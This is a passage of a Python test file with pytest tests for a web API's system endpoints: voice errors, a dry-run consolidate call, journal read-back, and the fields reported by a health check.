        assert response.json()["error"]["code"] == "VOICE_UNAVAILABLE"

    def test_consolidate_endpoint(self, client) -> None:
        response = client.post("/system/consolidate?dry_run=true")
        assert response.status_code == 200
        assert response.json()["dry_run"] is True

    def test_journal_endpoint_reads_back_a_task(self, client) -> None:
        services = client.app.state.services
        asyncio.run(services.journal.append("task_api", "request", "from the api test"))
        body = client.get("/system/journal/task_api").json()
        assert body["count"] == 1
        assert body["entries"][0]["kind"] == "request"
        assert client.get("/system/journal/nothing_here").json()["entries"] == []

    def test_health_reports_the_new_posture(self, client) -> None:
        body = client.get("/health").json()
        assert "interceptor_rules" in body
        assert "tokenjuice" in body and "usage" in body
        assert body["auth_required"] is False
